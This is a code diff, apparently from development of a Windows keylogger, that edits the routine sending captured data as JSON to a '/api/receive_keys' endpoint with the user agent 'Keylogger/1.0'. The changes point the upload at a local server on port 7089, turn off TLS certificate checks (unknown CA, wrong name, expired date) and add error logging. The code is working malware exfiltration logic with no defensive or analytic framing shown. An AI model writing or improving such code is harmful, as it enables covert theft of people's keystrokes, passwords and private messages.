@@ -7,12 +7,15 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-static const wchar_t* SERVER = L"your.server.com";
+static const wchar_t* SERVER = L"localhost";
 static const wchar_t* ENDPOINT = L"/api/receive_keys";
+static const INTERNET_PORT SERVER_PORT = 7089;
 
 bool send_data_https(const wchar_t* server, const wchar_t* endpoint, const char* json_data) {
     bool result = false;
-    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    HINTERNET hSession = NULL;
+    HINTERNET hConnect = NULL;
+    HINTERNET hRequest = NULL;
 
     hSession = WinHttpOpen(L"Keylogger/1.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
@@ -25,7 +28,7 @@ bool send_data_https(const wchar_t* server, const wchar_t* endpoint, const char*
         goto cleanup;
     }
 
-    hConnect = WinHttpConnect(hSession, server, INTERNET_DEFAULT_HTTPS_PORT, 0);
+    hConnect = WinHttpConnect(hSession, server, SERVER_PORT, 0);
     if (!hConnect) {
         log_error("WinHttpConnect failed");
         goto cleanup;
@@ -44,23 +47,27 @@ bool send_data_https(const wchar_t* server, const wchar_t* endpoint, const char*
         goto cleanup;
     }
 
-    LPCWSTR headers = L"Content-Type: application/json";
+    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
+        log_error("WinHttpSetOption failed, error code: %lu", GetLastError());
+    }
 
-    BOOL sendResult = WinHttpSendRequest(hRequest,
+    LPCWSTR headers = L"Content-Type: application/json";
+    DWORD headers_len = (DWORD)wcslen(headers);
+
+    if (!WinHttpSendRequest(hRequest,
         headers,
-        (DWORD)wcslen(headers),
+        headers_len,
         (LPVOID)json_data,
         (DWORD)strlen(json_data),
         (DWORD)strlen(json_data),
-        0);
-
-    if (!sendResult) {
-        log_error("WinHttpSendRequest failed");
+        0)) {
+        log_error("WinHttpSendRequest failed, error code: %lu", GetLastError());
         goto cleanup;
     }
 
     if (!WinHttpReceiveResponse(hRequest, NULL)) {
-        log_error("WinHttpReceiveResponse failed");
+        log_error("WinHttpReceiveResponse failed, error code: %lu", GetLastError());
         goto cleanup;
     }
 
